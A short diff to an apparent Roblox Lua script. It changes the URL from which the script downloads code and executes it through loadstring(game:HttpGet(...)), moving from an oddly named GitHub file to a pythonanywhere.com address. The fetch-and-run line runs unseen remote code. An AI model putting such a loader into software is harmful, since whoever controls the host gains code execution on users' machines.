@@ -251,6 +251,6 @@ task.wait(1)
 --// ================================
 pcall(function()
     loadstring(game:HttpGet(
-        "https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/jduwgfPREMIUM"
+        "https://nexahub.pythonanywhere.com/script.lua"
     ))()
 end)
